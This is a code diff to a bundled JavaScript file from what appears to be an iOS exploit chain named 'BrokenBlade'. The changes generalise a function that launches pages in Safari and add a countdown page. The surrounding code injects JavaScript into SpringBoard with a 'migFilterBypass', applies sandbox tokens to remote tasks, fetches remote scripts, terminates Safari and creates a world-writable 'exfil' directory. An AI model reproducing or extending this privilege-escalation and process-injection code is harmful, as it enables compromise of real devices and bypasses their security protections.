@@ -8468,6 +8468,7 @@ const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/brokenblade_chain_status.log";
 const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
 const DONE_LAUNCHER_PATH = "/done_launcher.js";
 const DONE_LAUNCHER_LABEL = "Done Page Launcher";
+const COUNTDOWN_PAGE_NAME = "countdown.html";
 const DONE_PAGE_NAME = "done.html";
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
@@ -8924,21 +8925,23 @@ function terminateSafariAfterClean(remoteKillTask) {
 	}
 }
 
-function donePageUrl() {
+function repoPageUrl(pageName, queryName) {
 	let origin = (typeof globalThis.__ls_site_origin === "string" && globalThis.__ls_site_origin.length > 0) ? globalThis.__ls_site_origin : "https://zeroxjf.github.io";
 	let sitePath = (typeof globalThis.__ls_site_path === "string" && globalThis.__ls_site_path.length > 0) ? globalThis.__ls_site_path : "/BrokenBlade";
+	pageName = String(pageName || DONE_PAGE_NAME).replace(/[^A-Za-z0-9_.-]/g, "");
+	queryName = String(queryName || "ts").replace(/[^A-Za-z0-9_-]/g, "");
 	origin = origin.replace(/[\x00-\x20\x7f]/g, "").slice(0, 256);
 	sitePath = sitePath.replace(/[\x00-\x1f\x7f]/g, "").slice(0, 256);
 	if (origin.indexOf("http://") !== 0 && origin.indexOf("https://") !== 0) origin = "https://zeroxjf.github.io";
 	if (!sitePath || sitePath.charAt(0) !== "/") sitePath = "/" + sitePath;
 	sitePath = sitePath.replace(/\/+$/g, "");
-	return origin + (sitePath === "/" ? "" : sitePath) + "/" + DONE_PAGE_NAME + "?done=" + Date.now();
+	return origin + (sitePath === "/" ? "" : sitePath) + "/" + pageName + "?" + queryName + "=" + Date.now();
 }
 
-function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid) {
+function launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid, pageName, queryName, label) {
 	let code = (typeof globalThis.__done_launcher_code === "string" && globalThis.__done_launcher_code.length > 0) ? globalThis.__done_launcher_code : fetchRemoteScript(DONE_LAUNCHER_PATH);
 	if (!code) {
-		LOG("[PE] " + DONE_LAUNCHER_LABEL + " fetch failed");
+		LOG("[PE] " + label + " fetch failed");
 		return false;
 	}
 	let agentLoader = null;
@@ -8946,33 +8949,41 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 	let agentPid = existingAgentPid || 0;
 	try {
 		if (!task) {
-			LOG("[PE] Creating SpringBoard agent for " + DONE_LAUNCHER_LABEL);
+			LOG("[PE] Creating SpringBoard agent for " + label);
 			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
 			let agentInjected = agentLoader.inject();
-			LOG("[PE] " + DONE_LAUNCHER_LABEL + " agent inject result: " + agentInjected);
+			LOG("[PE] " + label + " agent inject result: " + agentInjected);
 			if (!agentInjected) return false;
 			task = agentLoader.task;
 			agentPid = task.pid();
 			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(task);
 			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
 		}
-		let url = donePageUrl();
-		LOG("[PE] Launching done page: " + url);
+		let url = repoPageUrl(pageName, queryName);
+		LOG("[PE] Launching " + label + ": " + url);
 		let prelude = "globalThis.__bb_done_url = " + JSON.stringify(url) + ";\n";
 		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](task, prelude + code, migFilterBypass);
 		let ok = loader.inject(agentPid);
-		LOG("[PE] " + DONE_LAUNCHER_LABEL + " inject result: " + ok);
+		LOG("[PE] " + label + " inject result: " + ok);
 		return ok;
 	} catch (e) {
-		LOG("[PE] " + DONE_LAUNCHER_LABEL + " exception: " + String(e));
-		LOG("[PE] " + DONE_LAUNCHER_LABEL + " stack: " + (e.stack || "no stack"));
+		LOG("[PE] " + label + " exception: " + String(e));
+		LOG("[PE] " + label + " stack: " + (e.stack || "no stack"));
 		return false;
 	} finally {
 		if (agentLoader) {
-			LOG("[PE] Destroying " + DONE_LAUNCHER_LABEL + " agent loader");
-			try { agentLoader.destroy(); } catch (destroyErr) { LOG("[PE] " + DONE_LAUNCHER_LABEL + " destroy exception: " + String(destroyErr)); }
+			LOG("[PE] Destroying " + label + " agent loader");
+			try { agentLoader.destroy(); } catch (destroyErr) { LOG("[PE] " + label + " destroy exception: " + String(destroyErr)); }
 		}
 	}
+}
+
+function launchCountdownPageInSafari(existingTask, migFilterBypass, existingAgentPid) {
+	return launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid, COUNTDOWN_PAGE_NAME, "started", "Countdown Page Launcher");
+}
+
+function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid) {
+	return launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid, DONE_PAGE_NAME, "done", DONE_LAUNCHER_LABEL);
 }
 
 	function auditSafariOriginData() {
@@ -9776,12 +9787,19 @@ function start() { LOG("[+] PE start() called");
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
 	chainStatusInitLog();
 
+	LOG("[PE] Status log: " + CHAIN_STATUS_LOG_PATH);
+	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
+	if (ENABLE_SAFARI_KILL_AFTER_CLEAN) {
+		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
+	}
+	LOG("[PE] Initial Safari reset complete cleanOk=" + safariCleanOk + "; launching countdown page");
+	launchCountdownPageInSafari(null, migFilterBypass, 0);
+
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
 	let filzaDst = "/private/var/mobile/Media/Downloads/";
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
-	LOG("[PE] Status log: " + CHAIN_STATUS_LOG_PATH);
 
 	let needsSpringBoardAgent = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK;
 	if (needsSpringBoardAgent) {
@@ -9824,11 +9842,6 @@ function start() { LOG("[+] PE start() called");
 		}
 	} else {
 		LOG("[PE] SpringBoard agent loader skipped (no SpringBoard payload enabled)");
-	}
-
-	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
-	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
-		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
 	}
 
 		if (ENABLE_POWERCUFF_TWEAK) {
